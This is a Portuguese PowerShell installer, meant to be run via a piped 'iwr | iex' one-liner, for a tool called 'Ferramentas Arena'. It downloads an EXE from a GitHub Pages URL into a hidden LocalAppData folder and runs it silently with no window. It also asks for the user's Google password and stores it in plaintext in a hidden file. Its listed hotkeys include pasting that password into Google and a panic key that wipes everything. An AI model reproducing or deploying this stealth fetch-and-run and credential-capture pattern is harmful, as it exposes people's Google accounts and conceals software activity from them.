# ═══════════════════════════════════════════════════════
#   INSTALADOR FERRAMENTAS ARENA
#   Uso: iwr -useb https://SEUUSER.github.io/arena/i.ps1 | iex
# ═══════════════════════════════════════════════════════

$ErrorActionPreference = 'Stop'

# ── CONFIGURACAO ──────────────────────────────────────
$USUARIO = 'zaralhopintosilva-afk'
$REPO    = 'arena'
$EXENAME = 'FerramentasArena.exe'
# ──────────────────────────────────────────────────────

# TLS 1.2 (obrigatorio para downloads modernos)
[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor 3072

# Cores
function Info($m)  { Write-Host "  $m" -ForegroundColor Cyan }
function Ok($m)    { Write-Host "  [OK] $m" -ForegroundColor Green }
function Erro($m)  { Write-Host "  [ERRO] $m" -ForegroundColor Red }
function Aviso($m) { Write-Host "  [AVISO] $m" -ForegroundColor Yellow }

Clear-Host
Write-Host ""
Write-Host "  =================================================" -ForegroundColor Yellow
Write-Host "     FERRAMENTAS ARENA - INSTALADOR" -ForegroundColor Yellow
Write-Host "  =================================================" -ForegroundColor Yellow
Write-Host ""

# Pasta de destino (oculta em LocalAppData)
$destDir = Join-Path $env:LOCALAPPDATA 'ArenaFerramentas'
$exePath = Join-Path $destDir $EXENAME
$senhaPath = Join-Path $destDir 'senha.txt'

# URL do EXE via GitHub Pages (rapido e cacheado)
$baseUrl = "https://$USUARIO.github.io/$REPO"
$exeUrl  = "$baseUrl/$EXENAME"

Info "Servidor: $baseUrl"
Info "Destino:  $destDir"
Write-Host ""

# 1. Encerra instancia anterior (se rodando)
Info "Encerrando instancias anteriores..."
Get-Process -Name 'FerramentasArena' -ErrorAction SilentlyContinue | ForEach-Object {
    try { $_.Kill() } catch {}
}
Start-Sleep -Milliseconds 500
Ok "Ambiente limpo"

# 2. Cria pasta oculta
Info "Preparando pasta..."
if (-not (Test-Path $destDir)) {
    New-Item -ItemType Directory -Path $destDir -Force | Out-Null
}
try { (Get-Item $destDir -Force).Attributes = 'Hidden' } catch {}
Ok "Pasta pronta"

# 3. Baixa o EXE
Info "Baixando $EXENAME..."
try {
    (New-Object Net.WebClient).DownloadFile($exeUrl, $exePath)
    $sizeKB = [math]::Round((Get-Item $exePath).Length / 1KB, 1)
    Ok "Download concluido ($sizeKB KB)"
} catch {
    Erro "Falha no download: $($_.Exception.Message)"
    Erro "URL tentada: $exeUrl"
    return
}

# 4. Pergunta a senha (sem mostrar na tela)
Write-Host ""
Write-Host "  --------------------------------------------------" -ForegroundColor DarkGray
Write-Host "  Digite a senha do Google (nao aparece na tela):" -ForegroundColor White
Write-Host "  Deixe VAZIO para pular." -ForegroundColor DarkGray
Write-Host "  --------------------------------------------------" -ForegroundColor DarkGray
Write-Host ""

$senhaSecure = Read-Host "  Senha" -AsSecureString
$senhaPlain  = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto(
    [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($senhaSecure)
)

if ($senhaPlain -and $senhaPlain.Length -gt 0) {
    # Grava sem BOM, encoding UTF-8, sem quebra de linha final
    [System.IO.File]::WriteAllText($senhaPath, $senhaPlain, (New-Object System.Text.UTF8Encoding($false)))
    try { (Get-Item $senhaPath -Force).Attributes = 'Hidden' } catch {}
    Write-Host ""
    Ok "Senha configurada ($($senhaPlain.Length) caracteres)"
} else {
    Write-Host ""
    Aviso "Sem senha - voce digitara manualmente no Google"
}

# 5. Executa o EXE silenciosamente
Write-Host ""
Info "Iniciando FerramentasArena..."
$psi = New-Object System.Diagnostics.ProcessStartInfo
$psi.FileName = $exePath
$psi.WorkingDirectory = $destDir
$psi.UseShellExecute = $false
$psi.CreateNoWindow = $true
[System.Diagnostics.Process]::Start($psi) | Out-Null

Start-Sleep -Seconds 1

# 6. Mensagem final
Write-Host ""
Write-Host "  =================================================" -ForegroundColor Green
Write-Host "     PRONTO! Ferramentas ativas em segundo plano" -ForegroundColor Green
Write-Host "  =================================================" -ForegroundColor Green
Write-Host ""
Write-Host "     Ctrl+Alt+A  = mostra/esconde Arena" -ForegroundColor White
Write-Host "     Win+V       = clipboard premium" -ForegroundColor White
Write-Host "     Ctrl+V      = cola senha no Google" -ForegroundColor White
Write-Host "     Ctrl+Alt+F  = APAGA TUDO e sai" -ForegroundColor White
Write-Host ""
Write-Host "     (pode fechar esta janela do PowerShell)" -ForegroundColor DarkGray
Write-Host ""
